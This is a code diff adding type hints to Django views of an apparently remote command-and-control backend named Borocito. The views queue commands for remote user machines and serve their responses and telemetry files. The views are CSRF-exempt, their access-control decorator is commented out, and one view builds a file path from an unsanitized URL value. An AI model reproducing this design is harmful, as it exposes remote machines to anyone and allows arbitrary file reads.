@@ -1,4 +1,4 @@
-from django.http import HttpResponse, StreamingHttpResponse
+from django.http import HttpRequest, HttpResponse, StreamingHttpResponse
 from django.views.decorators.csrf import csrf_exempt
 from django.conf import settings
 
@@ -14,30 +14,27 @@ from control.utilities import control_instance_endpoint
 
 @csrf_exempt
 #@control_instance_endpoint
-def instance(request, uuid):
+def instance(request: HttpRequest, uuid):
     instancia = Instancia.objects.get(uuid=uuid)
     if request.method == "POST":
         instancia.command = request.POST.get('command')
         instancia.save(update_fields=['command'])
         return HttpResponse("OK!", content_type="plain/text")
     if request.method == "GET":
-        # TODO : dentro del Borocito-CLI, enviar respuesta, no la estructura completa
-        respuesta = str(f"#|{instancia.username}@{instancia.domain}|{instancia.uuid}|{instancia.borocito}\r\n")
-        respuesta += str(f"{instancia.response}{"\r\n" if instancia.response else ""}")
-        return HttpResponse(respuesta, content_type="plain/text")
+        return HttpResponse(instancia.response, content_type="plain/text")
 
 #@control_instance_endpoint
-def get_user_report(request, uuid):
+def get_user_report(request: HttpRequest, uuid):
     instancia = Instancia.objects.get(uuid=uuid)
     return HttpResponse(instancia.plain(), content_type="plain/text")
 
 #@control_instance_endpoint
-def get_telemetry_log(request, uuid):
+def get_telemetry_log(request: HttpRequest, uuid):
     respuesta = open(str(f"{settings.BOROCITO_TELEMETRY_DIR}/{uuid}.log"), "r").read()
     return HttpResponse(respuesta, content_type="plain/text")
 
 #@control_instance_endpoint
-def get_telemetry_file(request, filename):
+def get_telemetry_file(request: HttpRequest, filename):
     telemetria = Telemetria.objects.get(filename=filename)
     filename = os.path.basename(telemetria.telemetry.path)
     response = StreamingHttpResponse(
@@ -49,7 +46,7 @@ def get_telemetry_file(request, filename):
     return response
 
 #@control_instance_endpoint
-def list_instances(request):
+def list_instances(request: HttpRequest):
     instancias = Instancia.objects.all()
     respuesta = ""
     for instancia in instancias:
@@ -57,7 +54,7 @@ def list_instances(request):
     return HttpResponse(respuesta, content_type="plain/text")
 
 #@control_instance_endpoint
-def list_telemetry_logs(request):
+def list_telemetry_logs(request: HttpRequest):
     respuesta = ""
     telemetrias = os.listdir(settings.BOROCITO_TELEMETRY_DIR)
     for file in telemetrias:
@@ -66,7 +63,7 @@ def list_telemetry_logs(request):
     return HttpResponse(respuesta, content_type="plain/text")
 
 #@control_instance_endpoint
-def list_telemetry_files(request):
+def list_telemetry_files(request: HttpRequest):
     telemetrias = Telemetria.objects.all()
     respuesta = ""
     for telemetria in telemetrias:
